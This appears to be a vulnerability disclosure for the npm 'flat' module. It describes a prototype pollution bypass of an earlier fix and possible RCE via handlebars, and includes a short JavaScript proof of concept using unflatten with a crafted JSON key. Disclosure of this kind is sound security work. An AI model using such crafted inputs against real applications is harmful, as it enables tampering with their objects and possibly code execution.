# Description

The `flat` module is vulnerable against a `prototype pollution` issue, which is possible through the `bypass` of the fix proposed previously (https://github.com/hughsk/flat/commit/20ef0ef55dfa028caddaedbcb33efbdb04d18e13).
This could lead to `RCE` through a `well known` issue when interfacing `flat` with the `handlebars` template engine.

# PoC

1. Create the PoC file:

```js
// poc.js
const { unflatten } = require('flat');
let object = unflatten(JSON.parse('{"prototype":{"test":true}}'));
console.log(object.prototype.test)
```
2. Execute the following commands:

```bash
npm i flat
node poc.js // true
```
